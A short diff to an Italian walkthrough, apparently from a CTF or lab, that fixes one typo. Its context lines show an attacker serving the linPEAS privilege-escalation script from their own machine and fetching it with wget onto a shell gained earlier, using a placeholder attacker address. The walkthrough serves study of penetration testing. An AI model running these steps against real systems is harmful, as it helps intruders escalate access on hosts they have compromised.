@@ -28,7 +28,7 @@ apriamo un server http sulla nostra macchina dove è contenuto linPEAS
 python -m http.server 80
 ```
 
-facciamo una richiesta sulla shell otenuta prima tramite questo comando
+facciamo una richiesta sulla shell ottenuta prima tramite questo comando
 ```bash
 wget http://ipvostro/linPEAS.sh
 ```
